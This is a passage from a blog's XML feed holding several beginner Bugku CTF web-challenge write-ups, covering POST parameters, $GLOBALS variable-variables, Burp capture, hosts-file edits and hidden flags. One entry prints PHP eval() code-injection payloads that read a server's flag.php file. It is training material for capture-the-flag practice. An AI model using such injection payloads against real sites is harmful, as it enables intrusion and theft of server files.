    <content type="html"><![CDATA[<h1 id="4-web基础-POST"><a href="#4-web基础-POST" class="headerlink" title="4.web基础$_POST"></a>4.web基础$_POST</h1><p><strong>1.试题链接</strong><a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a> </p><p><strong>1.get请求  只获取数据  放在url之中，通过?key=value&amp;key=value  </strong></p><h5 id="2-post请求-要对服务器产生影响-放在form-Data中，通过key-value-amp-key-value"><a href="#2-post请求-要对服务器产生影响-放在form-Data中，通过key-value-amp-key-value" class="headerlink" title="2.post请求  要对服务器产生影响  放在form Data中，通过key:value&amp;key=value"></a>2.post请求  要对服务器产生影响  放在form Data中，通过key:value&amp;key=value</h5><p><strong>查看源码</strong></p><p><strong>利用了POST传值方式，利用POST进行传输数据，POST中what=flag即可出现flag</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_POST[<span class="string">'what'</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><p><strong>利用火狐插件，在POST栏中输入 what=flag,便得出flag值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$what=$_POST[<span class="string">'what'</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br><span class="line">flagflag&#123;bugku_get_ssseint67se&#125;</span><br></pre></td></tr></table></figure><h4 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏，其实在请求体中还是能看到的），并且对发送信息的量也没有限制(php默认是有限制的，默认post提交的数据不能大于8M，可以在PHP的配置文件中进行设置该限制)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST是一个超全局变量，全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用</span><br><span class="line">$_POST变量是一个数组，内容是由 HTTP POST 方法发送的变量名称和值</span><br><span class="line"> POST 传递 ：将表单数据提交服务器的一种请求，要提交的数据位于信息头后面的实体中。</span><br><span class="line">post方式，通过http包进行传值</span><br><span class="line">POST方式可以上传附件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_POST变量用于收集来自 method=&quot;post&quot; 的表单中的值</span><br><span class="line">method=&quot;post&quot; 意思是当前的数据用post方法传递 在服务器端可用response.post(&quot;表单域名&quot;)来获得数据</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;4-web基础-POST&quot;&gt;&lt;a href=&quot;#4-web基础-POST&quot; class=&quot;headerlink&quot; title=&quot;4.web基础$_POST&quot;&gt;&lt;/a&gt;4.web基础$_POST&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;1.试题链接&lt;/strong&gt;&lt;a hr
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>变量1-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E5%8F%98%E9%87%8F1/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/变量1/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:04:46.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><p>题目链接：<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a> </p><p><strong>代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;   <span class="comment">#说明文件在本地</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;<span class="comment">#get方式传值，变量条件</span></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];<span class="comment">#赋值args</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;    <span class="comment">#引用变量</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);       <span class="comment">#引用变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><h5 id="这道题利用了-GLOBALS变量"><a href="#这道题利用了-GLOBALS变量" class="headerlink" title="这道题利用了$GLOBALS变量"></a>这道题利用了$GLOBALS变量</h5><h5 id="因为args引用了变量，所以进行构造"><a href="#因为args引用了变量，所以进行构造" class="headerlink" title="因为args引用了变量，所以进行构造"></a>因为args引用了变量，所以进行构造</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure><h5 id="得到flag值"><a href="#得到flag值" class="headerlink" title="得到flag值"></a>得到flag值</h5><h3 id="GLOBAS-函数"><a href="#GLOBAS-函数" class="headerlink" title="GLOBAS() 函数"></a>GLOBAS() 函数</h3><p><a href="http://www.runoob.com/python/python-func-globals.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-globals.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals() 函数会以字典类型返回当前位置的全部全局变量。</span><br></pre></td></tr></table></figure><h3 id="highlight-file-函数"><a href="#highlight-file-函数" class="headerlink" title="highlight_file() 函数"></a>highlight_file() 函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数对文件进行语法高亮显示。</span><br></pre></td></tr></table></figure><h3 id="isset-函数"><a href="#isset-函数" class="headerlink" title="isset() 函数"></a>isset() 函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isset() — 检测变量是否设置。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;变量1&quot;&gt;&lt;a href=&quot;#变量1&quot; class=&quot;headerlink&quot; title=&quot;变量1&quot;&gt;&lt;/a&gt;变量1&lt;/h1&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://123.206.87.240:8004/index1.php&quot; target=&quot;_blan
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你必须让他停下-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/你必须让他停下/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:05:57.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>题目连接：<a href="http://123.206.87.240:8002/web12/" target="_blank" rel="noopener">http://123.206.87.240:8002/web12/</a> </p><p><strong>进入题目页面不停刷新，会出现一张图片</strong></p><p><strong>两种方法：</strong></p><p><strong>1.Burp抓包</strong></p><p><strong>2.不停进行页面源码查看（不推荐）</strong></p><p><strong>先说第一种方法</strong></p><p><strong>1.先设置好代理，进行抓包</strong></p><p><strong>2.可以一直Forward（丢包），直到flag出现</strong></p><p><strong>3.给Repeater（中继器）一直进行（Go）尝试，直到得到flag值&amp;</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Wed, 02 Jan 2019 02:25:08 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 630</span><br><span class="line"></span><br><span class="line">ï»¿<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Dummy game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function myrefresh()&#123;</span></span><br><span class="line"><span class="undefined">window.location.reload();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setTimeout('myrefresh()',500); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>I want to play Dummy game with othersÂ£Â¡But I can't stop!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>Stop at panda ! u will get flag<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"10.jpg"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>flag&#123;dummy_game_1s_s0_popular&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;你必须让他停下&quot;&gt;&lt;a href=&quot;#你必须让他停下&quot; class=&quot;headerlink&quot; title=&quot;你必须让他停下&quot;&gt;&lt;/a&gt;你必须让他停下&lt;/h1&gt;&lt;p&gt;题目连接：&lt;a href=&quot;http://123.206.87.240:8002/web12/&quot; t
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>域名解析</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/域名解析/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:07:09.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p><strong>听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag </strong></p><p><strong>域名可以直接访问，hosts文件</strong></p><p><strong>host文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个文件是根据TCP/IP for Windows 的标准来工作的。它的作用是定义IP地址</span><br><span class="line">类似于HTML网站的index.php首页功能</span><br></pre></td></tr></table></figure><h4 id="有两种方法"><a href="#有两种方法" class="headerlink" title="有两种方法"></a>有两种方法</h4><p><strong>1.windos下改host文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们修改本机的hosts文件。（修改时先以管理者运行记事本，再由记事本打开hosts文件，添加映射） </span><br><span class="line">hosts路径：`C:\Windows\System32\drivers\etc\hosts` </span><br><span class="line">添加映射：`120.24.86.145 flag.bugku.com`</span><br></pre></td></tr></table></figure><p><strong>访问flag.bugku.com ，得到flag值</strong></p><p><strong>2.Linux下sudo命令</strong></p><h4 id="在linux下域名解析，修改-etc-hosts文件："><a href="#在linux下域名解析，修改-etc-hosts文件：" class="headerlink" title="在linux下域名解析，修改/etc/hosts文件："></a>在linux下域名解析，修改/etc/hosts文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hosts</span><br></pre></td></tr></table></figure><p><strong>添加内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111.67.197.3   flag.bugku.com</span><br></pre></td></tr></table></figure><p><strong>保存之后，再在浏览器里打开flag.bugku.com就能看到flag。 </strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;域名解析&quot;&gt;&lt;a href=&quot;#域名解析&quot; class=&quot;headerlink&quot; title=&quot;域名解析&quot;&gt;&lt;/a&gt;域名解析&lt;/h1&gt;&lt;h4 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>头等舱</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E5%A4%B4%E7%AD%89%E8%88%B1%C2%B7/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/头等舱·/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:06:40.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>链接：<a href="http://123.206.87.240:9009/hd.php" target="_blank" rel="noopener">http://123.206.87.240:9009/hd.php</a> </p><p><strong>进入题目</strong></p><p><strong>只有一个什么都没有</strong></p><p><strong>查看源码，也是一样</strong></p><p><strong>既然是WEB题，直接用Burp工具</strong></p><p><strong>1.设置好代理</strong></p><p><strong>2.进行抓包，交接给中继器（Repeater）</strong></p><p><strong>3.点击GO获得flag值</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Wed, 02 Jan 2019 08:27:10 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: close</span><br><span class="line">flag&#123;Bugku_k8_23s_istra&#125;: </span><br><span class="line">Content-Length: 139</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>ä»ä¹ä¹æ²¡æã<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;头等舱&quot;&gt;&lt;a href=&quot;#头等舱&quot; class=&quot;headerlink&quot; title=&quot;头等舱&quot;&gt;&lt;/a&gt;头等舱&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.240:9009/hd.php&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>本地包含-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/本地包含/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:04:24.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><p>题目链接：<a href="http://123.206.87.240:8003/" target="_blank" rel="noopener">http://123.206.87.240:8003/</a> </p><p> 打开题目代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &quot;flag.php&quot;;    #说明文件在本地</span><br><span class="line">    $a = @$_REQUEST[&apos;hello&apos;]; #将$a赋值，描述了$_REQUEST全局变量，定义了hello为全局变量，可控</span><br><span class="line">    eval( &quot;var_dump($a);&quot;);  #将$a打印对hello进行赋值</span><br><span class="line">    show_source(__FILE__);   #显示文件路径</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="首先看到全局变量-REQUEST-说明了hello变量，是可以控制的，所以无论在url栏中对hello赋任何值，都会全盘接受"><a href="#首先看到全局变量-REQUEST-说明了hello变量，是可以控制的，所以无论在url栏中对hello赋任何值，都会全盘接受" class="headerlink" title="首先看到全局变量 $_REQUEST,说明了hello变量，是可以控制的，所以无论在url栏中对hello赋任何值，都会全盘接受"></a>首先看到全局变量 $_REQUEST,说明了hello变量，是可以控制的，所以无论在url栏中对hello赋任何值，都会全盘接受</h5><h3 id="REQUEST函数"><a href="#REQUEST函数" class="headerlink" title="$_REQUEST函数"></a>$_REQUEST函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.</span><br><span class="line">默认情况下包含$_GET、$_POST和$_COOKIE内容的关联数组。</span><br></pre></td></tr></table></figure><h3 id="Var-dump-函数"><a href="#Var-dump-函数" class="headerlink" title="Var_dump()函数"></a>Var_dump()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump—转储有关变量的信息</span><br><span class="line">函数作用是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.</span><br></pre></td></tr></table></figure><h5 id="var-dump（）是将a打印到界面中-在根据eval函数的特性-计算后面括号中的表达式"><a href="#var-dump（）是将a打印到界面中-在根据eval函数的特性-计算后面括号中的表达式" class="headerlink" title="var_dump（）是将a打印到界面中,在根据eval函数的特性(计算后面括号中的表达式)"></a>var_dump（）是将a打印到界面中,在根据eval函数的特性(计算后面括号中的表达式)</h5><h3 id="show-source-函数"><a href="#show-source-函数" class="headerlink" title="show_source()函数"></a>show_source()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source() 函数对文件进行语法高亮显示。</span><br><span class="line">可以理解为显示文件路径</span><br></pre></td></tr></table></figure><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将字符串作为PHP代码来计算</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h5 id="1-利用show-source-直接显示flag-php文件"><a href="#1-利用show-source-直接显示flag-php文件" class="headerlink" title="1.利用show_source(),直接显示flag.php文件"></a>1.利用show_source(),直接显示flag.php文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=show_source(&quot;flag.php&quot;)</span><br></pre></td></tr></table></figure><h5 id="2-直接对hello进行赋值得到flag值"><a href="#2-直接对hello进行赋值得到flag值" class="headerlink" title="2.直接对hello进行赋值得到flag值"></a>2.直接对hello进行赋值得到flag值</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file_get_concent(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure><h5 id="3-网上方法"><a href="#3-网上方法" class="headerlink" title="3.网上方法"></a>3.网上方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);print_r(file(&quot;./flag.php&quot;));%23</span><br></pre></td></tr></table></figure><h5 id="4-B站方法"><a href="#4-B站方法" class="headerlink" title="4.B站方法"></a>4.B站方法</h5><p>使用文件读取file://</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？hello=file(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;本地包含&quot;&gt;&lt;a href=&quot;#本地包含&quot; class=&quot;headerlink&quot; title=&quot;本地包含&quot;&gt;&lt;/a&gt;本地包含&lt;/h1&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://123.206.87.240:8003/&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>点击一百万次-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/点击一百万次/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:05:02.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h1><p>链接：<a href="http://123.206.87.240:9001/test/" target="_blank" rel="noopener">http://123.206.87.240:9001/test/</a> </p><p><strong>挺有意思的，两种方法</strong></p><p><strong>1.是真的点击一百万次</strong></p><p><strong>2.是利用火狐hackbar插件</strong></p><p><strong>右击源代码</strong></p><p><strong>看到这样一段PHP代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">    $(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">          <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h5 id="clicks这是重点"><a href="#clicks这是重点" class="headerlink" title="clicks这是重点"></a>clicks这是重点</h5><p><strong>利用火狐插件在POST中输入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clicks=1000000</span><br></pre></td></tr></table></figure><p>获得flag值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Not_C00kI3Cl1ck3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;点击一百万次&quot;&gt;&lt;a href=&quot;#点击一百万次&quot; class=&quot;headerlink&quot; title=&quot;点击一百万次&quot;&gt;&lt;/a&gt;点击一百万次&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.240:9001/test/&quot; target=&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>矛盾-bugku</title>
